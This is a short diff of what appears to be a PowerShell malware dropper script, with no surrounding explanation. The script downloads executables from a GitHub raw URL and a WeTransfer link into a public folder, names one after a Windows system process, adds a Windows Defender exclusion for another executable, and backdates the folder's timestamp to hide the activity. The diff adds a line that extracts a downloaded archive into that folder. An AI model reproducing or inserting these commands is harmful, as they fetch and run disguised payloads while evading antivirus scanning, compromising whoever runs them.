@@ -4,6 +4,8 @@ Invoke-WebRequest -Uri "https://raw.githubusercontent.com/milujemnastenky/bombar
 
 Invoke-WebRequest -Uri "https://we.tl/t-CzXWjA0dvu" -OutFile "C:\Users\Public\krnl\taskhostk.exe"
 
+Expand-Archive -Force "C:\Users\Public\krnl\taskhostk.zip" "C:\Users\Public\krnl"
+
 Add-MpPreference -ExclusionPath "C:\Users\Public\krnl\schvostkrnl.exe"
 
 Set-ItemProperty -Path "C:\Users\Public\krnl" -Name LastWriteTime -Value (Get-Date "2024-12-13 14:23:09")
